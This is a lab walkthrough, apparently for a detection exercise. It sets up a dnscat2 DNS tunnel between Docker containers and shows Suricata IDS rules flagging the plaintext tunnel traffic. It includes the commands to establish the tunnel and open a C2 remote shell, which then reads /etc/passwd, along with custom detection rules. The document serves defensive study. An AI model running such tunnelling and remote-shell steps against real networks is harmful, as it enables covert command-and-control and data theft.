# Phase 1: Traditional DNS Attack Detection

## Objective

Demonstrate that DNS tunneling over plaintext DNS (port 53) is easily detected by Suricata IDS rules. A dnscat2 tunnel is established between the `client` and `attacker` containers, and the resulting DNS traffic is captured and analyzed.

## Prerequisites

- Docker Desktop running with all four containers up:
  ```powershell
  cd D:\doh-lab\doh-lab
  docker compose up -d --build
  docker compose ps
  ```
- Verify all containers show `Up` status: `dns-server`, `client`, `attacker`, `monitor`

## Lab Architecture

| Container    | IP         | Role                    |
|-------------|------------|-------------------------|
| `dns-server` | 10.0.0.10 | Enterprise DNS resolver |
| `client`     | 10.0.0.20 | Internal client machine |
| `attacker`   | 10.0.0.30 | C2 server (dnscat2)     |
| `monitor`    | 10.0.0.40 | Network monitor (Suricata) |

## Terminal Setup

Open **4 separate terminals** in your IDE:

| Terminal | Label     | Purpose                          |
|----------|-----------|----------------------------------|
| A        | attacker  | dnscat2 server                   |
| B        | client    | dnscat2 client                   |
| C        | PowerShell| Packet capture & Suricata analysis |
| D        | PowerShell| Connectivity verification         |

## Step-by-Step Procedure

### Step 1: Verify Network Connectivity

**Terminal D (PowerShell):**

```powershell
docker exec -it client bash
```

Inside the client container:

```bash
ping -c 3 10.0.0.10   # dns-server
ping -c 3 10.0.0.30   # attacker
ping -c 3 10.0.0.40   # monitor
dig @10.0.0.10 google.com
```

Expected: All pings return 0% packet loss. DNS query returns A records for google.com. Exit with `exit` after verification.

### Step 2: Start Packet Capture on Client

**Terminal C (PowerShell):**

```powershell
docker exec client bash -c "tcpdump -i eth0 -w /tmp/phase1.pcap port 53 &"
```

> **Note:** We capture on the `client` container (not `monitor`) because Docker bridge networking only delivers unicast traffic to the participating containers. The client is one endpoint of the DNS tunnel, so it sees all tunnel traffic.

### Step 3: Start dnscat2 Server on Attacker

**Terminal A (PowerShell):**

```powershell
docker exec -it attacker bash
```

Inside the attacker container:

```bash
cd /opt/dnscat2/server
ruby dnscat2.rb --dns "host=0.0.0.0,port=53" --no-cache --security=open
```

Expected output:
```
Starting Dnscat2 DNS server on 0.0.0.0:53
```

**Keep this terminal open. Do not close it.**

### Step 4: Build and Run dnscat2 Client

**Terminal B (PowerShell):**

```powershell
docker exec -it client bash
```

Inside the client container, compile the dnscat2 client (required after every container rebuild):

```bash
apt-get update && apt-get install -y build-essential git
git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2
cd /opt/dnscat2/client
make
```

After seeing `*** dnscat successfully compiled`, establish the tunnel:

```bash
/opt/dnscat2/client/dnscat --dns "server=10.0.0.30,port=53" --no-encryption
```

Expected output:
```
Session established!
```

**Keep this terminal open. Do not close it.**

### Step 5: Execute C2 Commands Through the Tunnel

**Terminal A (attacker — dnscat2 prompt):**

After the client connects, the dnscat2 server will display:
```
New window created: 1
Session 1 security: UNENCRYPTED
```

Enter the session:
```
window -i 1
```

Create a remote shell:
```
shell
```

After seeing `Shell session created!`, switch to the shell window:
```
window -i 2
```

Execute commands through the DNS tunnel (**wait 5 seconds between each command**):

```bash
whoami
```

```bash
cat /etc/passwd
```

```bash
ls -la /
```

Expected: Each command's output appears after a few seconds delay (DNS tunneling is slow by nature). For example, `whoami` should return `root`.

### Step 6: Stop Packet Capture

**Terminal C (PowerShell):**

```powershell
docker exec client bash -c "pkill tcpdump"
```

### Step 7: Run Suricata Analysis on Captured Traffic

Copy the pcap to the monitor container:

```powershell
docker cp client:/tmp/phase1.pcap D:\doh-lab\doh-lab\phase1\phase1.pcap
docker cp D:\doh-lab\doh-lab\phase1\phase1.pcap monitor:/tmp/phase1.pcap
```

Run Suricata in offline mode against the pcap:

```powershell
docker exec monitor bash -c "truncate -s 0 /var/log/suricata/fast.log; suricata -c /etc/suricata/suricata.yaml -r /tmp/phase1.pcap -l /var/log/suricata/ --runmode=single"
```

### Step 8: View Detection Results

```powershell
docker exec monitor bash -c "cat /var/log/suricata/fast.log"
```

Expected output (repeated for each DNS tunnel packet):
```
04/12/2026-04:09:49.332286  [**] [1:1000001:2] ALERT - dnscat2 DNS tunnel detected [**] [Priority: 3] {UDP} 10.0.0.20:43392 -> 10.0.0.30:53
04/12/2026-04:09:49.332286  [**] [1:1000004:1] ALERT - Suspicious DNS MX query to non-mail domain [**] [Priority: 3] {UDP} 10.0.0.20:43392 -> 10.0.0.30:53
```

Save alerts to the phase1 output directory:

```powershell
docker exec monitor bash -c "cat /var/log/suricata/fast.log" > D:\doh-lab\doh-lab\phase1\suricata-alerts.txt
```

## Suricata Detection Rules

The custom rules are defined in `monitor/suricata-rules/dns-tunnel.rules`:

```
# Rule 1: Detect DNS queries containing "dnscat" (dnscat2 tunnel signature)
alert dns any any -> any any (msg:"ALERT - dnscat2 DNS tunnel detected"; dns.query; content:"dnscat"; nocase; sid:1000001; rev:2;)

# Rule 2: Detect DNS queries with long hex-encoded subdomain (tunneling pattern)
alert dns any any -> any any (msg:"ALERT - Suspicious hex-encoded DNS subdomain"; dns.query; pcre:"/^[a-z]+\.[a-f0-9]{16,}\./"; sid:1000002; rev:2;)

# Rule 3: Detect high-entropy DNS query names (potential data exfiltration)
alert dns any any -> any any (msg:"ALERT - Unusually long DNS query name detected"; dns.query; pcre:"/^.{50,}/"; sid:1000003; rev:2;)

# Rule 4: Detect DNS MX record queries to non-standard domains (tunneling evasion)
alert dns any any -> any any (msg:"ALERT - Suspicious DNS MX query to non-mail domain"; dns.query; content:"dnscat"; sid:1000004; rev:1;)
```

### How the Rules Work

| Rule | Detection Method | Why It Triggers |
|------|-----------------|----------------|
| 1000001 | Matches "dnscat" in query name | dnscat2 prepends `dnscat.` to all tunnel queries |
| 1000002 | Regex matches hex-encoded subdomains (16+ hex chars) | dnscat2 encodes tunnel data as hex strings in subdomains |
| 1000003 | Matches query names longer than 50 characters | Tunnel queries carry encoded payloads in domain names |
| 1000004 | Matches MX queries containing "dnscat" | dnscat2 uses MX/TXT/CNAME records for data transport |

## Output Files

| File | Description |
|------|-------------|
| `phase1/phase1.pcap` | Raw packet capture of DNS tunnel traffic (238 packets) |
| `phase1/suricata-alerts.txt` | Suricata IDS alerts (239 alerts triggered) |

## Key Findings

1. **DNS tunneling over plaintext DNS is trivially detectable.** Suricata rules matched every single tunnel packet, generating 239 alerts from 238 captured packets.

2. **dnscat2 tunnel characteristics observed:**
   - All queries use the pattern `dnscat.<hex-encoded-data>`
   - Query types include MX, TXT, and CNAME (used for data transport)
   - Traffic flows from client (10.0.0.20) to attacker (10.0.0.30) on port 53
   - Steady ~1 second interval between queries (dnscat2 default polling)

3. **This motivates Phase 2:** If DNS tunneling is so easily detected over plaintext DNS, what happens when we wrap it in DoH (DNS over HTTPS)? Phase 2 will demonstrate that the same attack becomes invisible to Suricata when encrypted.

## Troubleshooting

**dnscat2 server: "Address already in use"**
```bash
# Inside the attacker container
pkill -f dnscat2
sleep 2
# Then restart the server
```

**dnscat2 client: "The server hasn't returned a valid response"**
- The attacker server was restarted while the client was still connected
- Kill the client (Ctrl+C) and reconnect

**tcpdump captures 0 packets on monitor**
- Docker bridge networking does not forward unicast traffic between other containers to monitor's interface
- Solution: capture on the `client` or `attacker` container instead

**Suricata: "No rule files match the pattern suricata.rules"**
- This is a warning, not an error. The default suricata.rules file was not downloaded (not needed)
- Custom rules in `dns-tunnel.rules` are loaded separately and work correctly
